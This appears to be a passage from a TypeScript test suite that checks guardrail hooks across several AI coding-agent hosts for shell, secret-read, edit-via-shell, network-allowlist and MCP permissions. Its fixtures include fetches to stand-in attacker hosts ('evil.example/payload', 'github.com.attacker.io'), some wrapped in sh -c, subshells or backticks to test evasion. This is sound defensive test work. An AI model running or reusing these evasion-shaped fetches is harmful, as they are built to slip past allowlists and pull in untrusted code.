    return (JSON.parse(res.stdout.trim()) as { decision: Verdict }).decision;
  }

  /** Antigravity shell calls arrive as `run_command` with a `CommandLine`. */
  function antigravityShellVerdict(cmd: string): Verdict {
    const res = spawnSync("node", [ANTIGRAVITY_GUARDRAILS], {
      cwd: GENERATED,
      input: JSON.stringify({
        conversationId: `perm-parity-shell-${process.pid}`,
        toolCall: { name: "run_command", args: { CommandLine: cmd } },
        workspacePaths: [GENERATED],
      }),
      encoding: "utf-8",
    });
    return (JSON.parse(res.stdout.trim()) as { decision: Verdict }).decision;
  }

  // ---------------------------------------------------------------------------
  // The assertions
  // ---------------------------------------------------------------------------

  describe("cross-host gate parity — shell", () => {
    for (const g of SHELL_GATES) {
      it(`${g.expect.toUpperCase()} on \`${g.cmd}\` (${g.why}) — all five hosts`, () => {
        expect({ host: "claude", v: claudeShellVerdict(g.cmd) }).toEqual({
          host: "claude",
          v: g.expect,
        });
        expect({ host: "opencode", v: opencodeVerdict("bash", g.cmd) }).toEqual({
          host: "opencode",
          v: g.expect,
        });
        expect({ host: "cursor", v: cursorVerdict({ command: g.cmd }) }).toEqual({
          host: "cursor",
          v: g.expect,
        });
        expect({ host: "codex", v: codexVerdict(g.cmd) }).toEqual({
          host: "codex",
          v: g.expect,
        });
        expect({ host: "antigravity", v: antigravityShellVerdict(g.cmd) }).toEqual({
          host: "antigravity",
          v: g.expect,
        });
      });
    }
  });

  describe("shell reads of secret files — script hosts gate, permission tables do not", () => {
    for (const g of SHELL_SECRET_READS) {
      it(`${g.expect.toUpperCase()} on \`${g.cmd}\` (${g.why}) — cursor/codex/antigravity; claude/opencode Bash rows allow`, () => {
        expect({ host: "cursor", v: cursorVerdict({ command: g.cmd }) }).toEqual({
          host: "cursor",
          v: g.expect,
        });
        expect({ host: "codex", v: codexVerdict(g.cmd) }).toEqual({
          host: "codex",
          v: g.expect,
        });
        expect({ host: "antigravity", v: antigravityShellVerdict(g.cmd) }).toEqual({
          host: "antigravity",
          v: g.expect,
        });
        // Bash rows only: Claude's `Read(...)` deny on key files also covers `cat` /
        // `head` / `tail` / `sed` / `tee`, which this simulator does not model.
        expect({ host: "claude", v: claudeShellVerdict(g.cmd) }).toEqual({
          host: "claude",
          v: "allow",
        });
        expect({ host: "opencode", v: opencodeVerdict("bash", g.cmd) }).toEqual({
          host: "opencode",
          v: "allow",
        });
      });
    }
  });

  // Codex is absent: its guardrail is registered on the shell tool only. Tracked in
  // docs/deferrals.jsonl → `codex-read-tier-gates-not-wired-file-read-tool-name-unverified`.
  // Shell-level reads (`cat .env`) are in SHELL_SECRET_READS above: script hosts only.
  describe("cross-host gate parity — file reads", () => {
    for (const g of READ_GATES) {
      it(`${g.expect.toUpperCase()} on reading \`${g.file}\` (${g.why}) — opencode/cursor/antigravity`, () => {
        expect({ host: "opencode", v: opencodeVerdict("read", g.file) }).toEqual({
          host: "opencode",
          v: g.expect,
        });
        expect({
          host: "cursor",
          v: cursorVerdict({ tool_name: "Read", tool_input: { path: g.file } }),
        }).toEqual({ host: "cursor", v: g.expect });
        expect({ host: "antigravity", v: antigravityReadVerdict(g.file) }).toEqual({
          host: "antigravity",
          v: g.expect,
        });
      });
    }
  });

  // ---------------------------------------------------------------------------
  // Shell-as-edit-channel
  // ---------------------------------------------------------------------------
  //
  // `.agents/rules.md` § Code Changes ("change file contents with edit/write tools").
  // The gate is ADVISORY on all three script hosts, never a block.
  //
  // opencode is absent — a glob-keyed table cannot parse a redirect target. Tracked in
  // docs/deferrals.jsonl → `opencode-has-no-script-hook-so-two-gates-are-inexpressible-there`.

  function advisoryText(host: "claude" | "codex" | "cursor", cmd: string): string {
    const script = { claude: CLAUDE_GUARDRAILS, codex: CODEX_GUARDRAILS, cursor: GUARDRAILS }[host];
    const payload =
      host === "cursor" ? { command: cmd } : { tool_name: "Bash", tool_input: { command: cmd } };
    const res = spawnSync("node", [script], {
      cwd: GENERATED,
      input: JSON.stringify(payload),
      encoding: "utf-8",
    });
    const out = res.stdout.trim();
    if (!out) return "";
    const doc = JSON.parse(out) as {
      permission?: string;
      agent_message?: string;
      hookSpecificOutput?: { additionalContext?: string; permissionDecision?: string };
    };
    const decision =
      host === "cursor" ? doc.permission : doc.hookSpecificOutput?.permissionDecision;
    // A block would show up as a non-allow permission — assert it never does.
    expect(decision).toBe(NO_BLOCK_DECISION[host]);
    return host === "cursor"
      ? (doc.agent_message ?? "")
      : (doc.hookSpecificOutput?.additionalContext ?? "");
  }

  /** What each host's hook output carries as its permission decision when it does not block. */
  const NO_BLOCK_DECISION = { claude: undefined, codex: undefined, cursor: "allow" } as const;

  const HOSTS = ["claude", "codex", "cursor"] as const;

  describe("shell-as-edit-channel — advisory on every script host", () => {
    const FLAGGED = [
      { cmd: 'sed -i.bak -E "s|a|b|g" plan.md', why: "in-place sed, the shape bkit-plan.md uses" },
      { cmd: "sed -i s/a/b/ src/app.ts", why: "in-place sed, GNU form" },
      { cmd: "perl -i -pe s/a/b/ src/app.js", why: "in-place perl" },
      { cmd: "echo hi > notes.md", why: "redirect into a source file" },
      { cmd: "cat tpl > src/generated.ts", why: "redirect into a source file" },
      { cmd: "sh -c 'echo x > src/a.ts'", why: "redirect inside a sh -c script" },
      { cmd: "echo $(echo x > src/a.ts)", why: "redirect inside a command substitution" },
      { cmd: 'bash -lc "sed -i s/a/b/ src/app.ts"', why: "in-place sed inside bash -lc" },
    ];

    for (const { cmd, why } of FLAGGED) {
      it(`ADVISES on \`${cmd}\` (${why}) — and never blocks`, () => {
        for (const host of HOSTS) {
          expect({
            host,
            advised: advisoryText(host, cmd).includes("edits files through the shell"),
          }).toEqual({ host, advised: true });
        }
      });
    }

    // A gate that fires on ordinary shell plumbing gets disabled, so silence here is a
    // load-bearing property, not an omission.
    const SILENT = [
      { cmd: "echo hi > /dev/null", why: "the single most common redirect there is" },
      { cmd: 'echo "K=v" >> "$GITHUB_ENV"', why: "CI env handoff" },
      { cmd: "grep x foo > /tmp/out.txt", why: "scratch file" },
      { cmd: "pnpm test 2> err.log", why: "log capture, and a numbered fd" },
      { cmd: "pnpm build && node dist/x.js", why: "no redirect at all" },
      { cmd: "git status --porcelain", why: "plain read" },
      { cmd: "rg -n 'import x > a.ts here' src", why: "a > inside single quotes is text" },
      { cmd: 'grep "a >> b.md" notes.txt', why: "a >> inside double quotes is text" },
    ];

    for (const { cmd, why } of SILENT) {
      it(`stays SILENT on \`${cmd}\` (${why})`, () => {
        for (const host of HOSTS) {
          expect({ host, text: advisoryText(host, cmd) }).toEqual({ host, text: "" });
        }
      });
    }

    it("a sanctioned bulk rewrite (sed -i over a file list) is advised but NOT blocked", () => {
      const bulkCmd = `sed -i.bak -E 's|plan-v[0-9]+-split\\.md|99-x-plan.md|g' "$f"`;
      for (const host of HOSTS) {
        // advisoryText asserts "never blocks" internally for each host.
        expect({ host, advised: advisoryText(host, bulkCmd).length > 0 }).toEqual({
          host,
          advised: true,
        });
      }
    });
  });

  describe("cross-host gate parity — curl / wget in a shell", () => {
    // Every host allows a fetch to an ALLOWLISTED host with no interruption — the common
    // path, and the one context-fetch blocks take. They differ only on an UNDECLARED host:
    //
    //   Cursor    asks   — parses the URL host in bkit-guardrails.cjs
    //   opencode  asks   — `curl *: ask` + `curl *{domain}*: allow`, substring not host-parsed
    //   Claude    advises — a permission table cannot match a URL host
    //   Codex     advises — parses `permissionDecision: "ask"` but does not implement it
    //
    // No SHELL_GATES row: that table asserts ONE verdict across all four.
    const ALLOWED = "curl -fsSL https://api.github.com/repos/x/y";
    const UNDECLARED = "curl -fsSL https://evil.example/payload";

    it("allowlisted host: no interruption on any host that resolves the allowlist", () => {
      expect({ host: "cursor", v: cursorVerdict({ command: ALLOWED }) }).toEqual({
        host: "cursor",
        v: "allow",
      });
      // opencode is asserted against the TEMPLATE, which carries only the `curl *: ask`
      // base. Its per-domain `curl *{domain}*: allow` rows are injected at install time
      // from the consumer's resolved allowlist (injectOpencodeDerivedAllows), and the
      // rendered result is covered in install/modules/index.integration.test.ts. So "ask" here is
      // the template's honest verdict, not a gap in the host.
      expect({ host: "opencode(template)", v: opencodeVerdict("bash", ALLOWED) }).toEqual({
        host: "opencode(template)",
        v: "ask",
      });
      expect({ host: "claude", advised: advisoryText("claude", ALLOWED) }).toEqual({
        host: "claude",
        advised: "",
      });
      expect({ host: "codex", v: codexVerdict(ALLOWED) }).toEqual({ host: "codex", v: "allow" });
    });

    it("undeclared host: Cursor/opencode ask, Claude/Codex advise — nobody silently allows", () => {
      expect({ host: "cursor", v: cursorVerdict({ command: UNDECLARED }) }).toEqual({
        host: "cursor",
        v: "ask",
      });
      expect({ host: "opencode", v: opencodeVerdict("bash", UNDECLARED) }).toEqual({
        host: "opencode",
        v: "ask",
      });
      expect({
        host: "claude",
        flagged: advisoryText("claude", UNDECLARED).includes(
          "not on this repo's network allowlist",
        ),
      }).toEqual({ host: "claude", flagged: true });
      expect({ host: "codex", v: codexVerdict(UNDECLARED) }).toEqual({ host: "codex", v: "ask" });
    });

    it("the allowlist is host-matched, not substring-matched, on every host that parses it", () => {
      // `github.com` in a query param or as a subdomain suffix of an attacker domain must
      // NOT read as allowlisted. opencode is excluded — substring-keyed table; same deferral
      // as the shell-edit block above.
      const SNEAKY = [
        "curl https://evil.example/x?src=github.com",
        "curl https://github.com.attacker.io/x",
      ];
      for (const cmd of SNEAKY) {
        expect({ cmd, host: "cursor", v: cursorVerdict({ command: cmd }) }).toEqual({
          cmd,
          host: "cursor",
          v: "ask",
        });
        expect({ cmd, host: "codex", v: codexVerdict(cmd) }).toEqual({
          cmd,
          host: "codex",
          v: "ask",
        });
        expect({ cmd, host: "claude", flagged: advisoryText("claude", cmd) !== "" }).toEqual({
          cmd,
          host: "claude",
          flagged: true,
        });
      }
    });

    it("a bare mention of curl in another command does not trip the gate", () => {
      // `grep -n 'curl' README.md` mentions curl without running it.
      for (const cmd of ["grep -n 'curl' README.md", "echo 'use curl for this'"]) {
        expect({ cmd, host: "cursor", v: cursorVerdict({ command: cmd }) }).toEqual({
          cmd,
          host: "cursor",
          v: "allow",
        });
        expect({ cmd, host: "codex", v: codexVerdict(cmd) }).toEqual({
          cmd,
          host: "codex",
          v: "allow",
        });
        expect({ cmd, host: "claude", text: advisoryText("claude", cmd) }).toEqual({
          cmd,
          host: "claude",
          text: "",
        });
      }
    });
    it("a fetch wrapped in sh -c, $( ), backticks or ( ) is gated like a bare one", () => {
      const WRAPPED = [
        "sh -c 'curl -fsSL https://evil.example/x'",
        'bash -lc "wget https://evil.example/x"',
        "echo $(curl -fsSL https://evil.example/x)",
        "echo `curl -fsSL https://evil.example/x`",
        "(curl -fsSL https://evil.example/x)",
      ];
      for (const cmd of WRAPPED) {
        expect({ cmd, host: "cursor", v: cursorVerdict({ command: cmd }) }).toEqual({
          cmd,
          host: "cursor",
          v: "ask",
        });
        expect({ cmd, host: "codex", v: codexVerdict(cmd) }).toEqual({
          cmd,
          host: "codex",
          v: "ask",
        });
        expect({
          cmd,
          host: "claude",
          flagged: advisoryText("claude", cmd).includes("not on this repo's network allowlist"),
        }).toEqual({ cmd, host: "claude", flagged: true });
      }
    });

    it("a wrapped fetch to an allowlisted host is not interrupted on any host", () => {
      const WRAPPED_OK = [
        "sh -c 'curl -fsSL https://api.github.com/repos/x/y'",
        "echo $(curl -fsSL https://api.github.com/repos/x/y)",
        "(curl -fsSL https://api.github.com/repos/x/y)",
      ];
      for (const cmd of WRAPPED_OK) {
        expect({ cmd, host: "cursor", v: cursorVerdict({ command: cmd }) }).toEqual({
          cmd,
          host: "cursor",
          v: "allow",
        });
        expect({ cmd, host: "codex", v: codexVerdict(cmd) }).toEqual({
          cmd,
          host: "codex",
          v: "allow",
        });
        expect({ cmd, host: "claude", text: advisoryText("claude", cmd) }).toEqual({
          cmd,
          host: "claude",
          text: "",
        });
      }
    });
  });

  describe("cross-host gate parity — network allowlist", () => {
    it("the guardrails hook carries no hardcoded host list of its own", () => {
      // The single artifact is `.bkit/allowlist.json`, written from the registry at
      // install; every host's hook reads it and carries no literal list.
      for (const hook of [
        GUARDRAILS,
        CODEX_GUARDRAILS,
        ANTIGRAVITY_GUARDRAILS,
        CLAUDE_GUARDRAILS,
      ]) {
        const guardrails = fs.readFileSync(hook, "utf-8");
        expect(guardrails).not.toContain("SHIPPED_NETWORK_BASES");
        expect(guardrails).toContain('path.join(".bkit", "allowlist.json")');
      }
    });

    it("every host's hook finds the allowlist from the payload's repo dirs, whatever its own cwd", () => {
      // Antigravity runs plugin hooks with cwd set to the plugin dir, and any host may run
      // its hook outside the repo: the hook locates the repo from the payload, then walks up.
      const ALLOWED = "curl -fsSL https://api.github.com/repos/x/y";
      const outside = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-hook-cwd-"));
      const pluginDir = path.join(GENERATED, ".agents", "plugins", "bkit");
      fs.mkdirSync(pluginDir, { recursive: true });
      const run = (script: string, cwd: string, payload: unknown): string =>
        spawnSync("node", [script], {
          cwd,
          input: JSON.stringify(payload),
          encoding: "utf-8",
        }).stdout.trim();
      const bash = (extra: object) => ({
        tool_name: "Bash",
        tool_input: { command: ALLOWED },
        ...extra,
      });
      const agy = (extra: object) => ({
        conversationId: `perm-parity-cwd-${process.pid}`,
        toolCall: { name: "run_command", args: { CommandLine: ALLOWED } },
        ...extra,
      });
      const cursorOut = (cwd: string, payload: unknown) =>
        (JSON.parse(run(GUARDRAILS, cwd, payload)) as { permission: Verdict }).permission;
      const agyOut = (cwd: string, payload: unknown) =>
        (JSON.parse(run(ANTIGRAVITY_GUARDRAILS, cwd, payload)) as { decision: Verdict }).decision;
      try {
        expect({
          cursorRoots: cursorOut(outside, { command: ALLOWED, workspace_roots: [GENERATED] }),
          cursorCwd: cursorOut(outside, { command: ALLOWED, cwd: pluginDir }),
          codex: run(CODEX_GUARDRAILS, outside, bash({ cwd: pluginDir })),
          claude: run(CLAUDE_GUARDRAILS, outside, bash({ cwd: pluginDir })),
          antigravityPluginDir: agyOut(pluginDir, agy({ workspacePaths: [GENERATED] })),
          antigravityWalkUp: agyOut(pluginDir, agy({})),
          antigravityOutside: agyOut(outside, agy({ workspacePaths: [GENERATED] })),
        }).toEqual({
          cursorRoots: "allow",
          cursorCwd: "allow",
          codex: "",
          claude: "",
          antigravityPluginDir: "allow",
          antigravityWalkUp: "allow",
          antigravityOutside: "allow",
        });
        // Control: with no repo dir anywhere the hook finds no allowlist — Cursor asks,
        // Antigravity blocks once to show its fetch advisory.
        expect(cursorOut(outside, { command: ALLOWED })).toBe("ask");
        expect(agyOut(outside, agy({ conversationId: `perm-parity-cwd-ctl-${process.pid}` }))).toBe(
          "deny",
        );
      } finally {
        fs.rmSync(outside, { recursive: true, force: true });
      }
    });

    it("the shipped Claude settings seed no host grants of its own", () => {
      // Grants arrive only via enrichClaudeSettingsAllows, which records what it wrote so it can
      // later prune it.
      const webFetch = claudePermissions().allow.filter((a) => a.startsWith("WebFetch(domain:"));
      expect(webFetch).toEqual([]);
    });

    it("every derived base reaches BOTH fetch surfaces on every host (fetch tool + shell)", () => {
      // The gap this closes: the derived set reached the OpenCode SHELL (curl/wget globs)
      // but never the OpenCode fetch TOOL (`webfetch`), so an allowlisted host still
      // prompted when the agent used the fetch tool. Every surface the allowlist encodes
      // must carry every base — declared hosts included.
      const cwd = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-net-parity-"));
      try {
        fs.mkdirSync(path.join(cwd, ".agents"), { recursive: true });
        fs.writeFileSync(
          path.join(cwd, ".agents", "context.md"),
          "<!-- bkit:end -->\n<!-- allowed-domains:start -->\nvercel.com\n<!-- allowed-domains:end -->\n",
          "utf-8",
        );
        const bases = networkAllowlistBases(resolveNetworkAllowlist(cwd));
        expect(bases).toContain("vercel.com"); // the declared host reached the derived set
        expect(bases).toContain("github.com"); // the shipped set is present too

        const claudeAllow = resolveClaudeDerivedAllows(cwd);
        const opencodePerm = JSON.parse(
          renderOpencodeJson(OPENCODE_JSON, "github", "openrouter", cwd),
        ).permission as { bash: Record<string, string>; webfetch: Record<string, string> };
        writeNetworkAllowlist(cwd, false, makeWriteSet(), "[test]");
        const hookDomains = (
          JSON.parse(fs.readFileSync(path.join(cwd, NETWORK_ALLOWLIST_RELPATH), "utf-8")) as {
            domains: string[];
          }
        ).domains;

        const surfaces = bases.flatMap((base): Array<[label: string, granted: boolean]> => [
          // Claude — fetch tool only (a permission table cannot match a URL host).
          [`claude tool:${base}`, claudeAllow.includes(`WebFetch(domain:${base})`)],
          // OpenCode — fetch tool AND shell.
          [`opencode tool:${base}`, opencodePerm.webfetch[`*${base}*`] === "allow"],
          [`opencode shell curl:${base}`, opencodePerm.bash[`curl *${base}*`] === "allow"],
          [`opencode shell wget:${base}`, opencodePerm.bash[`wget *${base}*`] === "allow"],
          // Cursor / Codex / Antigravity / Claude hooks — shell, read from this artifact.
          [`hook shell:${base}`, hookDomains.includes(base)],
        ]);
        const missing = surfaces.filter(([, granted]) => !granted).map(([label]) => label);
        expect(missing).toEqual([]);
      } finally {
        fs.rmSync(cwd, { recursive: true, force: true });
      }
    });
  });

  describe("cross-host gate parity — MCP servers", () => {
    // One `mcp-servers` block in context.md, three encodings. Every host must pre-approve
    // every tool on a declared server — and nothing on an undeclared one.
    it("a declared server is allowed on Claude, Cursor and opencode; an undeclared one is not", () => {
      const cwd = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-mcp-parity-"));
      try {
        fs.mkdirSync(path.join(cwd, ".agents"), { recursive: true });
        fs.writeFileSync(
          path.join(cwd, ".agents", "context.md"),
          "<!-- bkit:end -->\n<!-- mcp-servers:start -->\nsentry\n<!-- mcp-servers:end -->\n",
        );
        const settings = path.join(cwd, "settings.json");
        fs.copyFileSync(CLAUDE_SETTINGS, settings);
        enrichClaudeSettingsAllows(settings, cwd, false, { writes: [] });
        const claudeAllow = JSON.parse(fs.readFileSync(settings, "utf-8")).permissions
          .allow as string[];

        writeCursorCliPermissionsArtifact(cwd, false);
        const cursorAllow = JSON.parse(
          fs.readFileSync(path.join(cwd, ".cursor", "cli.json"), "utf-8"),
        ).permissions.allow as string[];

        const opencodePerm = JSON.parse(
          renderOpencodeJson(OPENCODE_JSON, "github", "openrouter", cwd),
        ).permission as Record<string, unknown>;

        expect({
          claude: claudeAllow.includes("mcp__sentry__*"),
          claudeConnector: claudeAllow.includes("mcp__claude_ai_sentry__*"),
          cursor: cursorAllow.includes("Mcp(sentry:*)"),
          opencode: opencodePerm["sentry_*"],
        }).toEqual({ claude: true, claudeConnector: true, cursor: true, opencode: "allow" });

        expect({
          claude: claudeAllow.some((a) => a.includes("vercel")),
          cursor: cursorAllow.some((a) => a.includes("vercel")),
          opencode: Object.keys(opencodePerm).some((k) => k.includes("vercel")),
        }).toEqual({ claude: false, cursor: false, opencode: false });
      } finally {
        fs.rmSync(cwd, { recursive: true, force: true });
      }
    });

    // bkit's own tracker server needs no context.md entry: the shipped Claude settings
    // pre-approve it for every tracker alike.
    it.each(ISSUE_TRACKERS.filter((t) => t !== "none"))(
      "the shipped Claude settings pre-approve every %s tracker MCP tool",
      (tracker) => {
        expect(claudePermissions().allow).toContain(`mcp__${tracker}__*`);
      },
    );
  });
});
